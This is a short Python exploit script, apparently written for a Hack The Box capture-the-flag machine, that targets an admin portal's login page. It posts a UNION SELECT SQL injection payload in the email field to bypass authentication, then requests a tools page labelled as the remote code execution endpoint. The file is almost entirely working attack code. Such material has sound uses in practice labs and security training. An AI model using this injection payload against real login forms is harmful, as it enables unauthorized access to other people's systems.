#!/usr/bin/python3

from pwn import *
import requests
import signal
import sys
import threading
import pdb
import time
import urllib3
import logging
from scapy.all import *
from termcolor import colored

urllib3.disable_warnings()

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def def_handler(sig, frame):
    print(colored(f"\n\n[!] Exiting...\n", 'red'))
    p1.failure("::(Ctrl + c pressed)::")
    sys.exit(1)

# CTRL + c
signal.signal(signal.SIGINT, def_handler)
p1 = log.progress("Sending Payload")
p1.status("Attempting Auto-Login")

# Globa Variables
login_url = "https://admin-portal.europacorp.htb/login.php"
rce_url = "https://admin-portal.europacorp.htb/tools.php"
#proxies = {'http': 'http://127.0.0.1:4646', 'https': 'http://127.0.0.1:4646'}

def makeRequest():
    s = requests.session()
    s.verify = False

    post_data = {
        'email': "test@test.com' UNION SELECT 1,2,3,4,5-- -",
        'password': '1234'
    }

    r = s.post(login_url, data=post_data)
    r = s.get(rce_url)
    print(r.text)

if __name__ == '__main__':

    makeRequest()
